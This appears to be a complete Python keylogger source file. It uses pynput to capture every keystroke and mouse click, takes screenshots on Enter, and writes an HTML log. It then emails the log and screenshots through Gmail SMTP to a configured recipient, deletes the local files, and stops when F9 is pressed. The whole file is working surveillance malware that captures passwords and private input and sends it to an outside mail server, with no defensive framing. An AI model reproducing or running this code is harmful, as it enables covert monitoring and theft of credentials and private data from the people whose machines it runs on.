# author: brownfox2k6
# 22 February 2024

# TODO: Edit this before using
SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 587
SENDER = "your_email@gmail.com"
SMTP_PASSWORD = "abcdefghijklmnop"  # 16 lowercase letters
RECIPIENT = "recipient@gmail.com"


# Site-packages
import cv2, dxcam, pynput
# Stdlibs
import datetime, os, shutil, smtplib, ssl, traceback
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def add_color(s, color) -> None:
  return f"<font color=\"{color}\">{s}</font>"

def get_time() -> str:
  return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def print_traceback() -> None:
  s = "<br>===== ERROR OCCURRED =====<br>" \
    + traceback.format_exc().replace('\n', "<br>") \
    + "<br>==========<br>"
  log_f.write(add_color(s, "red"))

def get_screenshot() -> None:
  try:
    idx = len(os.listdir("./s_manifest"))
    img = cam.grab()
    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
    cv2.imwrite(f"./s_manifest/s{idx}.jpg", img)
    log_f.write(add_color(f"「s{idx}」 ", "blue"))
  except:
    print_traceback()


def keyboard_press(
    key: pynput.keyboard.Key
  ) -> None:
  """
  on_press for keyboard listener.
  """
  # Check if it's an alphanumeric key
  try:
    # Check if it's a combination key - goes with Ctrl
    try:
      key = SPE_CTRL[str(key).replace("'", "")]
      key = add_color(key, "green")

    # This can cause ValueError (if it's not a combination key)
    except KeyError:
      key = key.char

  # This can cause AttributeError (if it's a special key)
  except AttributeError:
    if key == pynput.keyboard.Key.f9:
      # Press F9 -> send mail AND terminate
      log_f.write(add_color(f"<br><br>「Keylogger terminated {get_time()}」 ", "blue"))
      send_mail()
      os._exit(0)
    elif key == pynput.keyboard.Key.enter:
      # Enter -> create new line in log file + get time
      key = add_color(f"<br>「↩ {get_time()}」", "blue")
      get_screenshot()
    elif key == pynput.keyboard.Key.backspace:
      key = add_color("「⌫」", "green")
    elif key == pynput.keyboard.Key.delete:
      key = add_color("「⌦」", "green")
    elif key == pynput.keyboard.Key.space:
      key = add_color("「_」", "green")
    else:
      key = key.name \
            .replace("_l", "").replace("_r", "").replace("_gr", "")
      if key == "shift":
        key = "⬆"
      elif key == "tab":
        key = "↹"
      key = add_color(f"「{key}」", "green")
  log_f.write(key)


def mouse_click(
    x: int,
    y: int,
    button: pynput.mouse.Button,
    pressed: bool
  ) -> None:
  """
  on_click for mouse listener.
  """
  if pressed:
    log_f.write(add_color(f"<br>「🖱️ {x} {y} {button.name} {get_time()}」 ", "blue"))


def send_mail() -> None:
  """
  Send keylogger data through SMTP.
  """
  try:
    print("Initializing and logging in SMTP server")
    server = smtplib.SMTP(host=SMTP_HOST, port=SMTP_PORT)
    server.ehlo()
    server.starttls(context=ssl.create_default_context())
    server.ehlo()
    server.login(user=SENDER, password=SMTP_PASSWORD)

    print("Reading log file")
    log_f.seek(0)
    body = log_f.read()
    body = f'<font size="4" face="Trebuchet MS">{body}</font>'

    print("Initializing message")
    message = MIMEMultipart()
    message["Subject"] = f"Keylogger {get_time()}"
    message["From"] = SENDER
    message["To"] = RECIPIENT
    message.attach(MIMEText(body, "html", "utf-8"))

    print("Attaching screenshots")
    for f in os.listdir("./s_manifest"):
      if not f.endswith(".jpg"):
        continue
      with open(f"./s_manifest/{f}", "rb") as ipath:
        p = MIMEApplication(ipath.read(), _subtype="jpg")
        p.add_header("Content-Disposition", f"attachment; filename={f}")
        message.attach(p)

    print("Sending email")
    server.send_message(message)
    server.quit()
    print("Email sent successfully")

    print("Deleting everything in disk that have just been sent")
    log_f.close()
    shutil.rmtree("./s_manifest", ignore_errors=True)

  except:
    print_traceback()


if __name__ == "__main__":
  SPE_CTRL = {
    'A': '\\x01', 'B': '\\x02', 'C': '\\x03', 'D': '\\x04', 'E': '\\x05',
    'F': '\\x06', 'G': '\\x07', 'H': '\\x08', 'I': '\\t', 'J': '\\n',
    'K':'\\x0b', 'L': '\\x0c', 'M': '\\r', 'N': '\\x0e', 'O': '\\x0f',
    'P': '\\x10', 'Q': '\\x11', 'R': '\\x12', 'S': '\\x13', 'T': '\\x14',
    'U': '\\x15', 'V': '\\x16', 'W': '\\x17', 'X': '\\x18', 'Y': '\\x19',
    'Z': '\\x1a', '0': '<48>', '1': '<49>', '2': '<50>', '3': '<51>',
    '4': '<52>', '5': '<53>', '6': '<54>', '7': '<55>', '8': '<56>',
    '9': '<57>'
  }

  # Initialization
  try:
    os.mkdir("./s_manifest")
  except FileExistsError:
    pass
  cam = dxcam.create()
  log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
  log_f.write(add_color(f"<br><br>「Keylogger started {get_time()}」<br>", "blue"))

  # Create threads
  keyboard = pynput.keyboard.Listener(on_press=keyboard_press)
  mouse = pynput.mouse.Listener(on_click=mouse_click)

  # Start both threads
  keyboard.start()
  mouse.start()

  # Wait until both threads are completely executed
  keyboard.join()
  mouse.join()
